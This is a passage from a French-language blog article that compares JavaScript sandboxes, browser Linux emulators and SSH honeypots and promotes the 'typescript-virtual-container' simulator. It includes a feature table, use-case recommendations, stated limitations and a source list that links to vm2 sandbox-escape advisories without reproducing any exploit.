Ces deux-là sont injectés en haut de chaque fichier du bundle via l'option `inject` d'esbuild, donc `process` et `Buffer` sont disponibles globalement sans aucun import explicite. `process.js` est minuscule : `env`, `version`, `platform: 'browser'`, `nextTick` via `queueMicrotask`, `uptime` via `performance.now()`. `buffer.js` est une réimplémentation complète de `Buffer` par-dessus `Uint8Array` -- toutes les méthodes `readUInt32BE`, `writeInt16LE`, les encodages hex/base64 dont l'implémentation SSH et le VFS dépendent.

---

L'ensemble des polyfills fait environ 640 lignes de JS écrit à la main au total. Pas de packages npm. Pas de Wasm. Et le résultat est un bundle navigateur qui est juste la bibliothèque, tournant nativement, sans aucune de l'anxiété habituelle du "mais est-ce que ça marche vraiment dans le navigateur ?" que tu as avec les bibliothèques conçues pour Node en premier. Ça vaut le coup de jeter un œil au dossier `polyfills/` dans le dépôt si tu es curieux -- chaque fichier est bien contenu et lisible par lui-même, ce qui est un choix de style que j'apprécie beaucoup.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Catégorie** | Bac à sable JS | Bac à sable JS | Bac à sable JS | Émulateur | Émulateur | Node.js/Wasm | Honeypot | Simulateur |
| **Isole le JS** | ⚠️ portée | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | partiel | n/a | ✅ Worker |
| **Vrai noyau Linux** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Interpréteur shell** | ❌ | ❌ | ❌ | ✅ (réel) | ✅ (réel) | ✅ (réel) | partiel | ✅ (personnalisé) |
| **~170 commandes Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | partiel | ~20 | ✅ |
| **Permissions POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | partiel | ✅ appliquées |
| **Gestion utilisateurs** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minime | ✅ complète |
| **Vrai serveur SSH** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/audit** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/instantané VFS** | ❌ | ❌ | ❌ | limité | ❌ | ❌ | ❌ | ✅ |
| **Réseau virtuel L2/L3** | ❌ | ❌ | ❌ | basique | ❌ | ❌ | ❌ | ✅ complet |
| **VPN virtuel** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Support navigateur** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js natif** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **API typée** | basique | ✅ | ✅ | minimale | ❌ | ✅ | ❌ | ✅ complète |
| **Compatibilité binaire** | n/a | n/a | n/a | ✅ | ✅ | partiel | n/a | ❌ |
| **Temps démarrage** | instantané | instantané | instantané | 15-40s | 15-40s | 2-5s | instantané | <1s |
| **RAM/instance** | ~1 Mo | ~3-10 Mo | ~5-15 Mo | 150-256 Mo | 200+ Mo | ~100 Mo | ~50 Mo | ~5-20 Mo |
| **Dépendances runtime** | 0 | 1 (native) | 1 (Wasm) | 0 | propriétaire | 1 | dépendances Python | 3 (ssh2, ws, fflate) |
| **Statut** | stable | ✅ actif | ✅ actif | ✅ très actif | commercial | ✅ actif | ✅ actif | ✅ actif |

---

## Quand utiliser quoi

**Tu dois exécuter du JavaScript non fiable -- une formule soumise par un utilisateur, un plugin, un hook de script.**  
→ `isolated-vm`. Vrai V8 Isolate, limites mémoire strictes, pont de communication explicite. Évite `vm2` -- la liste des CVE ne fait que s'allonger, sérieusement c'est comme une nouvelle tous les quelques mois. Évite `vm` -- ce n'est pas un bac à sable du tout, s'il te plaît.

**Tu dois isoler du JS et tu ne veux pas d'extension native, ou tu as besoin de compatibilité navigateur.**  
→ `quickjs-emscripten`. Frontière Wasm, module d'environ 500 Ko, fonctionne dans les navigateurs et Node. Plus lent que V8 mais vraiment isolé.

**Tu dois démarrer un vrai OS Linux non modifié avec compatibilité binaire.**  
→ `v86` pour du Linux 32-bit, ou `container2wasm` si tu as une image Docker existante. Accepte 150 Mo+ de RAM et 30 secondes de démarrage, c'est le deal. Si tu as besoin de 64-bit, regarde CheerpX ou utilise juste un vrai runtime de conteneur.

**Tu dois intégrer un terminal de type Linux dans une application web sans backend.**  
→ `v86` (OS complet, lourd, lent à démarrer) ou le bundle navigateur de `typescript-virtual-container` (simulateur, plus léger, démarrage instantané, inclut `startxfce4` pour un bureau complet ce qui est assez cool pour le coup).

**Tu as besoin de tutoriels de codage interactifs en ligne ou d'un IDE navigateur.**  
→ WebContainers si tu es focalisé sur l'écosystème Node.js. CheerpX si tu as besoin d'un vrai userspace Linux. Le bundle navigateur de `typescript-virtual-container` si tu veux une option plus légère avec une API typée.

**Tu veux collecter des TTP d'attaquants SSH à grande échelle.**  
→ Cowrie est le standard de production, point final. Tourne sur n'importe quel serveur Linux, s'intègre avec tous les SIEM, a un mode LLM maintenant. Utilise juste Cowrie.

**Tu veux des données de honeypot SSH dans une application Node.js avec une API programmable.**  
→ `typescript-virtual-container`. Les commandes s'exécutent réellement. Le VFS est une vraie structure de données que tu peux instantanément capturer et différencier. L'attaquant obtient un environnement interactif convaincant, et tu obtiens des données d'audit structurées sans quitter Node.

**Tu as besoin d'automatisation shell / de tests en CI sans Docker.**  
→ `typescript-virtual-container`. Démarre en moins d'une seconde, instantané avant un test, restauration après. Exécute des commandes shell avec une API typée. Pas de démon Docker, pas de noyau, pas de VM, pas d'attente.

**Tu as besoin d'environnements shell multi-locataires (SaaS, éducation, formation).**  
→ `typescript-virtual-container`. 5-20 Mo par instance vs. 150-256 Mo pour un émulateur. 100 utilisateurs simultanés : ~2 Go vs. ~25 Go. C'est une grosse différence en coûts d'hébergement !

**Tu as besoin d'un honeypot réaliste qui te permette aussi de construire un laboratoire réseau multi-VM.**  
→ `typescript-virtual-container` est la seule chose dans cet espace qui fait les deux.

---

## Ce qu'il ne peut pas faire (et je veux être honnête là-dessus)

Il ne peut pas exécuter de binaires x86 natifs. Si tu as besoin de compiler du code C, d'exécuter un vrai interpréteur Python, ou d'utiliser un logiciel compilé pour Linux, il n'y a pas d'ABI noyau pour soutenir ces appels système. Les commandes comme `gcc`, `python3`, et `node` sont des stubs -- elles répondent à `--version` et aux invocations courantes, mais n'exécutent rien de réel.

C'est le compromis fondamental : tu gagnes 10 à 50 fois moins de mémoire, un démarrage instantané, la compatibilité navigateur, une API typée, du vrai SSH, et du réseau virtuel -- et tu abandonnes la compatibilité binaire avec l'userspace Linux.

Fortune a beaucoup réfléchi à ça en concevant le projet. Pour les cas d'usage qu'elle ciblait -- honeypots, tests, terminaux embarqués, environnements CI -- exécuter un binaire compilé n'est en fait jamais nécessaire. Les pipelines shell, la manipulation de fichiers, le routage réseau et SSH couvrent tout. Mais si ton cas d'usage nécessite un vrai logiciel compilé, `v86` ou Docker est la bonne réponse, pas ça.

---

## Pour conclure

Alors voilà. Cet écosystème est plus large et plus fragmenté qu'il n'y paraît de l'extérieur. `vm` est un séparateur de portée, pas un bac à sable. `vm2` continue d'accumuler des CVE (pour de vrai, regarde les avis de ce mois-ci). `isolated-vm` est la bonne réponse pour l'isolation JS mais JS uniquement. `quickjs-emscripten` est le bon choix quand tu as besoin de compatibilité navigateur ou que tu veux éviter les extensions natives. `v86` et CheerpX sont de vrais émulateurs quand tu as besoin de vraie compatibilité binaire. WebContainers est Node.js en Wasm, pas un environnement Linux généraliste. Cowrie est l'étalon-or des honeypots SSH, mais c'est du Python et pas natif Node.

Et puis il y a `typescript-virtual-container` -- le projet de Fortune -- qui vit un peu dans sa propre catégorie. Pas un émulateur, pas un bac à sable JS, pas un honeypot passif. Quelque chose entre tous qui s'est avéré étonnamment utile pour beaucoup de choses qu'aucun des autres ne peut faire.

`typescript-virtual-container` comble le fossé qu'aucun des autres ne touche : un environnement shell Linux complet et programmable avec du vrai SSH, SFTP, des permissions POSIX, la gestion des utilisateurs, du réseau virtuel, et une API TypeScript typée -- tournant dans environ 10 Mo, démarrant en moins d'une seconde, fonctionnant à la fois dans Node.js et le navigateur.

Si tu veux l'essayer : le code source est sur [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) et il y a une démo en ligne (incluant `startxfce4` pour un bureau complet, ce qui est franchement malade) sur [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Va voir ça et laisse quelques étoiles à Fortune sur GitHub, elle les mérite !

Merci d'avoir lu -- celui-ci était un long même pour mes standards :) j'espère que ça t'a été utile !

---

## Sources

J'ai essayé de lier chaque affirmation à une source primaire -- avis CVE, docs officielles, dépôts GitHub, articles de blog des mainteneurs. Quelques notes : la liste des CVE de vm2 continue de s'allonger donc le lien FortiGuard pourrait être obsolète au moment où tu liras ceci (regarde la page des avis GitHub pour les plus récentes). Les liens Bellard sont tous stables -- son site personnel est là depuis toujours et le contenu ne change pas. Et si tu veux approfondir l'un des polyfills, il suffit de parcourir le dossier `polyfills/` dans le dépôt `typescript-virtual-container` directement -- c'est plus lisible que n'importe quelle description que je pourrais écrire ici.

### Bacs à sable JavaScript

- **Module `vm` de Node.js** -- documentation officielle : [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Avertissement de sécurité `vm` de Node.js** -- "Le module vm n'est pas un mécanisme de sécurité. Ne l'utilisez pas pour exécuter du code non fiable" : [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm : [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub : [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Chronologie des CVE vm2** -- Alerte FortiGuard avec la liste complète des CVE et dates : [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- Évasion par erreur async, GHSA : [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function escape, gist PoC : [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Entrée Exploit DB avec PoC complet : [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE vm2 2026** -- 11 nouvelles évasions, analyse : [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer : [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** -- Post-mortem d'oxeye.io sur CVE-2022-36067 : [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm : [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub : [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Internes V8 Isolate** -- Guide d'intégration : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm : [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub : [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm : [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub : [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Moteur QuickJS** -- par Fabrice Bellard : [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Modèle de permissions Deno** -- docs : [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Sortie Deno 2** -- Octobre 2024 : [deno.com/blog/v2](https://deno.com/blog/v2)
- **Proposition TC39 ShadowRealm** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Proposition TC39 Compartments** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** -- Article pratique d'Andrew Healey sur l'approche de bac à sable Deno : [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Émulateurs Linux

- **`v86`** -- npm : [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub : [github.com/copy/v86](https://github.com/copy/v86) · Démo : [copy.sh/v86](https://copy.sh/v86)
- **Matrice de support OS v86** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS utilisé par v86) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Extensions Bochs VBE** (référence VGA) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Émulateur de Bellard : [bellard.org/jslinux](https://bellard.org/jslinux/) · Notes techniques (TinyEMU, historique, asm.js→Wasm) : [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- Source C : [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Miroirs GitHub non officiels : [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- Émulateur JS OpenRISC : [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Démo : [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- docs : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Guide pthreads : [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm : [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · Docs API : [webcontainers.io](https://webcontainers.io) · Annonce : [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Aperçu InfoQ : [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub : [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Article de blog NTT : [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Article de Simon Willison : [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack terminal

- **xterm.js** -- npm : [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub : [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · site : [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm : [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft) : [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypots

- **Cowrie** -- GitHub : [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Docs : [docs.cowrie.org](https://docs.cowrie.org) · Site : [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (archivé) : [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub : [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub : [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub : [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- Honeypot SSH Node.js minimal : [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- Liste organisée : [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- Découverte d'informations système (comment les attaquants identifient les honeypots) : [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm** : [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub** : [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Démo en ligne** : [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Guide d'architecture** : [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (implémentation du protocole SSH) -- npm : [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub : [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (compression des instantanés VFS) -- npm : [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (transport shell WebSocket) -- npm : [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Lectures complémentaires

- **Modèle de permissions POSIX** -- Spécification Open Group : [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (patron utilisé dans la persistance VFS) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Modèle V8 Isolate** -- "Embedder's Guide" : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Spécification ISA RISC-V** (pour le contexte TinyEMU/JSLinux) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Architecture OpenRISC 1000** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** -- Simon Willison TIL, contraste utile avec l'approche Wasm : [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** -- Simon Willison TIL sur la taille du bundle quickjs-emscripten : [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
